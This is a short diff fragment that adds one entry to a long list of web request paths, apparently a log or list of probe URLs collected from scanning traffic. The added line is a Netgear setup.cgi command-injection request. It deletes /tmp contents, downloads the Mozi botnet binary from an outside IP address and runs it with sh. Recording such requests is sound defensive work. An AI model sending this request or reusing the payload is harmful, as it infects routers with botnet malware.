@@ -35114,3 +35114,4 @@ http://ifconfig.me/
 /css/dist/preferences/wp-login.php
 /admin/function.php?
 /?gad_source=5&gad_campaignid=21979123179&gclid=EAIaIQobChMI5OCEhc6ojgMVc1WkBB3VOAQSEAEYASAAEgIKwvD_BwE
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.205.170.50:49606/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
